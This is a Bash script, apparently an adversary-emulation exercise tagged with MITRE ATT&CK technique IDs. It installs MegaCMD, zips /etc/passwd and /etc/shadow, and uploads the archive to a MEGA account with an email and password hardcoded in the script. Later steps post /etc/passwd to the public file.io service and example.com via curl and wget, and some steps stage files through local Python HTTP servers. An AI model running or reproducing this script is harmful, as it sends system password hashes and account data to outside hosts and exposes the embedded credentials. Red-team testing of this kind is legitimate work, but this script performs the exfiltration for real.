#!/bin/bash

# Function to detect the OS and version
detect_os_version() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        case "$ID" in
            ubuntu)
                OS_NAME="ubuntu"
                OS_VERSION=$VERSION_ID
                ;;
            debian)
                OS_NAME="debian"
                OS_VERSION=$VERSION_CODENAME
                ;;
            linuxmint)
                OS_NAME="mint"
                OS_VERSION=$VERSION_ID
                ;;
            kali)
                OS_NAME="kali"
                OS_VERSION=$VERSION_CODENAME
                ;;
            *)
                echo "Unsupported OS."
                exit 1
                ;;
        esac
    else
        echo "Unable to detect OS version."
        exit 1
    fi
}

# Function to install MegaCMD on Ubuntu-based distributions
install_megacmd_ubuntu() {
    local version=$1
    local url="https://mega.nz/linux/repo/xUbuntu_${version}/amd64/megacmd-xUbuntu_${version}_amd64.deb"

    echo "Downloading MegaCMD for Ubuntu $version..."
    wget "$url" -O "megacmd-xUbuntu_${version}_amd64.deb"
    echo "Installing MegaCMD..."
    sudo apt install -y "./megacmd-xUbuntu_${version}_amd64.deb"
}

# Function to install MegaCMD on Debian-based distributions
install_megacmd_debian() {
    local version=$1
    local url="https://mega.nz/linux/repo/Debian_${version}/amd64/megacmd-Debian_${version}_amd64.deb"

    echo "Downloading MegaCMD for Debian $version..."
    wget "$url" -O "megacmd-Debian_${version}_amd64.deb"
    echo "Installing MegaCMD..."
    sudo apt install -y "./megacmd-Debian_${version}_amd64.deb"
}

# Function to install MegaCMD on Kali Linux
install_megacmd_kali() {
    local version=$1
    local url="https://mega.nz/linux/repo/Debian_${version}/amd64/megacmd-Debian_${version}_amd64.deb"

    echo "Downloading MegaCMD for Kali Linux ($version)..."
    wget "$url" -O "megacmd-Debian_${version}_amd64.deb"
    echo "Installing MegaCMD..."
    sudo apt install -y "./megacmd-Debian_${version}_amd64.deb"
}

# Main script execution
detect_os_version

case $OS_NAME in
    ubuntu)
        case $OS_VERSION in
            24.04 | 23.10 | 23.04 | 22.10 | 22.04 | 20.10 | 20.04 | 19.10 | 18.04)
                install_megacmd_ubuntu "$OS_VERSION"
                ;;
            *)
                echo "Unsupported Ubuntu version: $OS_VERSION"
                echo "Please manually download and install MegaCMD from the Mega.nz website."
                ;;
        esac
        ;;
    debian)
        case $OS_VERSION in
            bookworm)
                install_megacmd_debian "12"
                ;;
            bullseye)
                install_megacmd_debian "11"
                ;;
            buster)
                install_megacmd_debian "10.0"
                ;;
            testing)
                install_megacmd_debian "testing"
                ;;
            *)
                echo "Unsupported Debian version: $OS_VERSION"
                echo "Please manually download and install MegaCMD from the Mega.nz website."
                ;;
        esac
        ;;
    mint)
        case $OS_VERSION in
            21)
                install_megacmd_ubuntu "22.04"
                ;;
            20)
                install_megacmd_ubuntu "20.04"
                ;;
            19)
                install_megacmd_ubuntu "18.04"
                ;;
            *)
                echo "Unsupported Linux Mint version: $OS_VERSION"
                echo "Please manually download and install MegaCMD from the Mega.nz website."
                ;;
        esac
        ;;
    kali)
        case $OS_VERSION in
            kali-rolling)
                install_megacmd_kali "testing"
                ;;
            *)
                echo "Unsupported Kali Linux version: $OS_VERSION"
                echo "Please manually download and install MegaCMD from the Mega.nz website."
                ;;
        esac
        ;;
    *)
        echo "Unsupported OS: $OS_NAME"
        echo "Please manually download and install MegaCMD from the Mega.nz website."
        ;;
esac

# MEGA CMD Exfiltration
echo "Starting MEGA CMD Exfiltration..."

#Hostname
HOSTNAME=$(hostname)

# Set the paths
MEGACMD_PATH="/usr/bin"
MEGA_EMAIL="sisabasactivity@outlook.com"
MEGA_PASSWORD="Sisa@123"

#TO zip file and dir
TO_ZIP="/etc/passwd"
SHADOW="/etc/shadow"
ZIPPED_FILE="${HOSTNAME}.zip"
ZIP_FOLDER="Linux_output"
REMOTE_DEST="/Linux/"

# Zip the file
if zip -r "${ZIPPED_FILE}" "${TO_ZIP}" "${SHADOW}" "${ZIP_FOLDER}"; then
  echo "Zipping successful: ${ZIPPED_FILE}"
else
  echo "Zipping failed"
  exit 1
fi

# Login to Mega
echo "Logging in to Mega..."
${MEGACMD_PATH}/mega-login "${MEGA_EMAIL}" "${MEGA_PASSWORD}"

# Upload the zipped file
echo "Uploading to Mega..."
if ${MEGACMD_PATH}/mega-put "${ZIPPED_FILE}" "${REMOTE_DEST}"; then
  echo "Upload successful"
else
  echo "Upload failed"
  exit 1
fi

# Logout from Mega
echo "Logging out from Mega..."
${MEGACMD_PATH}/mega-logout

echo "MEGA CMD Exfiltration completed."

# Exfiltration Tests
echo "Starting Exfiltration Tests..."

# Create output folder
output_folder="${PWD}/Linux_output/Exfiltration"
mkdir -p "$output_folder"

# Function to log output
log_output() {
    local test_id=$1
    local output=$2
    echo -e "### ${test_id} ###\n${output}\n" >> "${output_folder}/Exfiltration_output.txt"
}

# T1048.002 Test 2 - Exfiltrate data HTTPS using curl freebsd,linux or macos
test_id="T1048.002 Test 2"
cp /etc/passwd "${PWD}/Exfildata.txt"
file="${PWD}/Exfildata.txt"
output=$(curl -F "file=@${file}" -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/ 2>&1)
log_output "$test_id" "$output"

# T1048.002 Test 3 - Exfiltrate data in a file over HTTPS using wget
test_id="T1048.002 Test 3"
output=$(wget --post-file="${file}" --timeout=5 --no-check-certificate https://example.com/ --delete-after 2>&1)
log_output "$test_id" "$output"

# T1048.002 Test 4 - Exfiltrate data as text over HTTPS using wget
test_id="T1048.002 Test 4"
output=$(wget --post-data="msg=Testing_Exfiltration_T1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after 2>&1)
log_output "$test_id" "$output"

# T1048.003 Test 8 - Python3 http.server
test_id="T1048.003 Test 8"
if [ $(which python3) ]; then
    # Change to the /tmp directory
    cd /tmp

    # Start the Python3 http.server on port 9090
    python3 -m http.server 9090 & PID=$!

    # Wait for 10 seconds
    sleep 10

    # Adversary system retrieves the data
    output=$(wget http://localhost:9090 2>&1)
    log_output "$test_id" "$output"

    # Terminate the Python3 http.server
    kill $PID
fi

# T1030 Data Transfer Size Limits test 1
test_id="T1030 Test 1"
folder_path="${PWD}/T1030"
file_name="T1030_data.txt"
if [ ! -d ${folder_path} ]; then
    mkdir -p ${folder_path}
    touch ${folder_path}/${file_name}
fi
dd if=/dev/urandom of=${folder_path}/${file_name} bs=20000000 count=1
cd ${folder_path}
output=$(split -b 500000 ${file_name} && ls -l ${folder_path})
log_output "$test_id" "$output"
sleep 5
if [ -f ${folder_path}/${file_name} ]; then
    rm -rf ${folder_path}
fi

# T1048.003 Test 1 - Exfiltration Over Alternative Protocol - HTTP
test_id="T1048.003 Test 1"
if ! command -v python3 &> /dev/null
then
    sudo apt-get update
    sudo apt-get install -y python3
fi
mkdir /tmp/victim-staging-area
echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
cd /tmp/victim-staging-area
python3 -m http.server 1337 &
PYTHON_PID=$!
sleep 10
output=$(wget http://localhost:1337/victim-file.txt -O /tmp/victim-file-downloaded.txt && ls /tmp/victim-file-downloaded.txt 2>&1)
kill $PYTHON_PID
log_output "$test_id" "$output"
rm -rf /tmp/victim-staging-area /tmp/victim-file-downloaded.txt

echo "Exfiltration Tests completed. Output saved in ${output_folder}/Exfiltration_output.txt"
